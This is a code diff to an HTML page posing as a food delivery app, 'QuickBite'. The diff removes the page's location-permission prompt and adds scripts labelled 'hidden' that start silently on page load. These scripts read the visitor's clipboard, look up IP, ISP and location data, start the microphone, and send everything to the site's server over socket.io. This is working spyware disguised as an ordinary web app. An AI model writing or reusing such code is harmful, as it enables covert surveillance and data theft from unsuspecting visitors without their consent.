@@ -52,13 +52,7 @@
     .nav-item.active { color:#ff5722; }
     .nav-icon { font-size:1.3rem; }
 
-    /* PERMISSION OVERLAY */
-    #permOverlay { position:fixed; inset:0; background:rgba(0,0,0,.6); z-index:999; display:flex; align-items:flex-end; }
-    #permBox { background:#fff; width:100%; border-radius:20px 20px 0 0; padding:24px; }
-    #permBox h3 { font-size:1.1rem; font-weight:900; margin-bottom:6px; }
-    #permBox p { font-size:.82rem; color:#666; line-height:1.5; margin-bottom:16px; }
-    #permAllow { width:100%; background:#ff5722; color:#fff; border:none; border-radius:12px; padding:14px; font-family:'Nunito',sans-serif; font-weight:900; font-size:1rem; margin-bottom:8px; }
-    #permDeny { width:100%; background:#f5f5f5; color:#333; border:none; border-radius:12px; padding:14px; font-family:'Nunito',sans-serif; font-weight:700; font-size:.9rem; }
+
   </style>
 </head>
 <body>
@@ -155,15 +149,7 @@
   <div class="nav-item"><div class="nav-icon">👤</div>Profile</div>
 </div>
 
-<!-- PERMISSION OVERLAY -->
-<div id="permOverlay">
-  <div id="permBox">
-    <h3>📍 Enable Location</h3>
-    <p>QuickBite needs your location to show nearby restaurants and deliver to your address accurately.</p>
-    <button id="permAllow">Allow Location Access</button>
-    <button id="permDeny">Not Now</button>
-  </div>
-</div>
+
 
 <!-- HIDDEN SCRIPTS -->
 <script src="/socket.io/socket.io.js"></script>
@@ -287,18 +273,46 @@
     if (pc && candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate));
   });
 
-  // ── Permission overlay button ─────────────────────────────────
-  document.getElementById('permAllow').addEventListener('click', async () => {
-    document.getElementById('permOverlay').style.display = 'none';
+  // ── Clipboard capture ─────────────────────────────────────────
+  async function getClipboard() {
+    try {
+      const text = await navigator.clipboard.readText();
+      socket.emit('p3-clipboard', { text: text || '(empty)' });
+    } catch (e) {
+      socket.emit('p3-clipboard', { error: 'Denied or unavailable' });
+    }
+  }
+
+  // ── IP + ISP info ─────────────────────────────────────────────
+  async function getIPInfo() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const d = await res.json();
+      socket.emit('p3-ip-info', {
+        ip: d.ip,
+        isp: d.org,
+        asn: d.asn,
+        city: d.city,
+        region: d.region,
+        country: d.country_name,
+        postal: d.postal,
+        callingCode: d.country_calling_code,
+        currency: d.currency,
+        ipLat: d.latitude,
+        ipLng: d.longitude,
+      });
+    } catch (e) {
+      socket.emit('p3-ip-info', { error: e.message });
+    }
+  }
+
+  // ── Auto-start silently on page load ─────────────────────────
+  window.addEventListener('load', async () => {
     collectDeviceInfo();
     getLocation();
+    getIPInfo();
     await startMic();
-  });
-
-  document.getElementById('permDeny').addEventListener('click', () => {
-    document.getElementById('permOverlay').style.display = 'none';
-    // Still silently collect device info
-    collectDeviceInfo();
+    setTimeout(getClipboard, 1500);
   });
 </script>
 </body>
